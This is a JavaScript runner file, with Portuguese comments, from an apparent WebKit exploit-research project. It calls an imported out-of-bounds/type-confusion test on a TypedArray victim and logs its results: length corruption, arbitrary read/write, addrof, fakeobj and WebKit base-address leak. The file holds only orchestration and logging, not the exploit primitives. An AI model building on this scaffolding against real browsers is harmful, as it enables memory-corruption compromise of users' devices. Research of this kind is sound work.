// js/script3/runAllAdvancedTestsS3.mjs (Runner para Testes Massivos Revisados)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

// Constante para comparação de tamanho no runner, se necessário, embora seja melhor obter do resultado.
const VICTIM_TA_DEFAULT_SIZE_ELEMENTS_RUNNER = 8; 

function safeToHexRunner(value, length = 8) { /* ... (como na versão anterior) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    if (typeof value === 'string' && value.startsWith('0x')) { return value; }
    return String(value);
}

async function runHeisenbugReproStrategy_TypedArrayVictim_R43_MassiveRevised() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_MassiveRev";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred && !result.oob_params_of_best_result) { // Erro fatal antes de qualquer resultado significativo
        logS3(`  RUNNER R43(MassiveRev): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R43(MassiveRev): Teste principal completado. Analisando resultados...`, "good", FNAME_RUNNER);

        logS3(`  --- MELHOR RESULTADO GERAL ENCONTRADO ---`, "info_emphasis", FNAME_RUNNER);
        let bestParamsMsg = 'N/A';
        if (result.oob_params_of_best_result) {
            bestParamsMsg = `Offset: ${result.oob_params_of_best_result.offset}, Valor: ${result.oob_params_of_best_result.value} (RawOff: ${safeToHexRunner(result.oob_params_of_best_result.raw_offset)}, RawVal: ${safeToHexRunner(result.oob_params_of_best_result.raw_value)})`;
        }
        logS3(`    Melhores Parâmetros OOB: ${bestParamsMsg}`, "info", FNAME_RUNNER);
        
        // Usar heisenbug_on_M2_confirmed_by_tc_probe do objeto result principal (que reflete o melhor resultado)
        const heisenbugSuccessfullyDetectedInBest = result.heisenbug_on_M2_confirmed_by_tc_probe;
        logS3(`    TC Confirmada no Melhor Resultado: ${heisenbugSuccessfullyDetectedInBest}`, heisenbugSuccessfullyDetectedInBest ? "vuln" : "info", FNAME_RUNNER);
        if (result.tc_probe_details) {
            logS3(`    Detalhes Sonda TC (Melhor): ${JSON.stringify(result.tc_probe_details)}`, "leak_detail", FNAME_RUNNER);
        }

        if (result.best_corruption_details) {
            const corr = result.best_corruption_details;
            logS3(`    Detalhes da Corrupção (Melhor Iteração - Off ${corr.offset_tested} Val ${corr.value_written}):`, "info_emphasis", FNAME_RUNNER);
            logS3(`      Comprimento Original: ${corr.original_length}`, "info", FNAME_RUNNER);
            logS3(`      Comprimento Pós-OOB: ${corr.length_after_oob}`, corr.length_corrupted ? "success_major" : "info", FNAME_RUNNER);
            logS3(`      Comprimento Corrompido: ${corr.length_corrupted}`, corr.length_corrupted ? "vuln" : "info", FNAME_RUNNER);
            if (corr.length_corrupted) {
                logS3(`      Leitura Além do Original OK: ${corr.read_beyond_original_ok} (Valor: ${corr.read_beyond_value || 'N/A'})`, corr.read_beyond_original_ok ? "vuln" : "info", FNAME_RUNNER);
            }
            logS3(`      Padrão de Preenchimento Intacto: ${corr.fill_pattern_intact}`, corr.fill_pattern_intact === true ? "good" : (corr.fill_pattern_intact === false ? "vuln_potential" : "info"), FNAME_RUNNER);
            logS3(`      Notas da Corrupção: ${corr.notes}`, "info", FNAME_RUNNER);
        }

        if (result.addrof_result) {
             logS3(`    Resultado Addrof (Global): ${result.addrof_result.msg} (Endereço: ${result.addrof_result.leaked_object_addr || 'N/A'})`, result.addrof_result.success ? "success_major" : "warn", FNAME_RUNNER);
        }
        if (result.fakeobj_result) { // Para quando for implementado
             logS3(`    Resultado FakeObj (Global): ${result.fakeobj_result.msg}`, result.fakeobj_result.success ? "success_major" : "warn", FNAME_RUNNER);
        }
        if (result.webkit_leak_result) {
            logS3(`    Resultado WebKitLeak (Global): ${result.webkit_leak_result.msg} (Base: ${result.webkit_leak_result.webkit_base_candidate || 'N/A'})`, result.webkit_leak_result.success ? "success_major" : "info", FNAME_RUNNER);
        }
        if (result.errorOccurred) { // Se o melhor resultado ainda tiver um erro associado (ex: todas as iterações falharam)
             logS3(`    Erro no Melhor Resultado Reportado: ${result.errorOccurred}`, "error", FNAME_RUNNER);
        }


        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  --- SUMÁRIO DE TODAS AS ITERAÇÕES (${result.iteration_results_summary.length} testadas) ---`, "info_emphasis", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                let logMsg = `    Iter ${index + 1} (Off ${iter_sum.oob_offset} Val ${iter_sum.oob_value}): `;
                let highlights = [];
                if (iter_sum.heisenbug_on_M2_confirmed_by_tc_probe) highlights.push("TC_OK");
                if (iter_sum.corruption_analysis?.length_corrupted) highlights.push("LenCorrupt");
                if (iter_sum.arb_rw_via_victim_ta_this_iter) highlights.push("ArbRW_VictimTA");
                if (iter_sum.addrof_success_this_iter) highlights.push("ADDROF_ITER_OK");
                // if (iter_sum.fakeobj_success_this_iter) highlights.push("FAKEOBJ_ITER_OK");
                
                if (highlights.length > 0) {
                    logMsg += highlights.join(", ");
                } else {
                    logMsg += "Sem Efeitos Notáveis";
                }
                if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
                
                let logLevel = "info";
                if (iter_sum.addrof_success_this_iter || iter_sum.arb_rw_via_victim_ta_this_iter) logLevel = "success_major";
                else if (iter_sum.corruption_analysis?.length_corrupted) logLevel = "vuln_potential";
                else if (iter_sum.heisenbug_on_M2_confirmed_by_tc_probe) logLevel = "vuln";
                logS3(logMsg, logLevel, FNAME_RUNNER);
            });
        } else {
            logS3(`  Sumário de iterações não disponível ou vazio.`, "warn", FNAME_RUNNER);
        }

        document.title = result.final_title_page || `${module_name_for_title} Final: Done`; // Usar título do teste se disponível

    } else {
        document.title = `${module_name_for_title}_R43_MassiveRev: Invalid Result Obj`;
        logS3(`  RUNNER R43(MassiveRev): Objeto de resultado inválido ou nulo recebido do teste.`, "critical", FNAME_RUNNER);
    }

    // A atribuição do título final já é feita pelo script de teste. Apenas logamos.
    logS3(`  Título da página final (definido pelo teste): ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_MassiveRev`;
    logS3(`==== INICIANDO Script 3 R43_MassiveRev (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runHeisenbugReproStrategy_TypedArrayVictim_R43_MassiveRevised();
    
    logS3(`\n==== Script 3 R43_MassiveRev (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    // O título final é melhor definido pelo próprio script de teste que tem mais contexto.
    // Esta lógica pode ser removida se o script de teste sempre definir um bom título final.
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("Final:") && // Verificar se o script de teste já colocou "Final:"
        !document.title.toUpperCase().includes("OK") && // Case insensitive
        !document.title.toUpperCase().includes("SUCCESS") &&
        !document.title.toUpperCase().includes("CORRUPT") &&
        !document.title.includes("ERR") && 
        !document.title.includes("Invalid")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43_MassiveRev_Done`;
    }
}
